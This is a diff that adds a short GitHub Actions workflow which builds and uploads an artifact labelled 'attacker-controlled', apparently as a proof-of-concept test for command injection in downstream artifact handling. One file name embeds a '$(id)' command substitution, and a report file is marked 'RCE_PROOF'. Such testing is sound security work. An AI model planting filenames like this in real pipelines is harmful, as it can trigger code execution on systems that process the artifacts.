@@ -1,0 +1,18 @@
+name: Test
+on:
+  push:
+    branches: [main]
+  pull_request:
+jobs:
+  upload:
+    runs-on: ubuntu-latest
+    steps:
+      - name: craft attacker-controlled artifact
+        run: |
+          mkdir -p content
+          printf 'RCE_PROOF normal body\n' > content/report.txt
+          printf 'x\n' > 'content/x$(id).txt'
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: content/
